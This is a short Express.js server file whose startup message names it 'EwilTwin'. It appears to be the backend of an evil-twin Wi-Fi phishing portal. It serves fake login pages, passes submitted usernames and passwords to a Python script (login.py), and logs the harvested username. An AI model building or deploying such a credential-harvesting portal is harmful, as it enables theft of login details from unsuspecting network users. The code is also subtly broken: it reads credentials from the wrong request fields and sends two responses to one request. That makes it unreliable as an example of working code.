import 'dotenv/config';
import cors from 'cors';
import express from 'express';
import path from 'path';
import axios from 'axios';
const spawn = require('child_process').spawn;

const app = express();

app.use(cors());
app.use(express.urlencoded());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'proxy.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
  const pythonProcess = spawn('python', ['./login.py', req.username, req.password]);
  pythonProcess.stdout.on('data', (data) => {
    let json = JSON.stringify(data);
    let string = data.toString('utf8');
    console.log(string);
  })
  res.sendFile(path.join(__dirname, 'loginPage.html'));
  console.log(req.body.username);
  res.redirect('/');
})

app.listen(process.env.PORT, () =>
  console.log(`EwilTwin app listening on port ${process.env.PORT}!`),
);
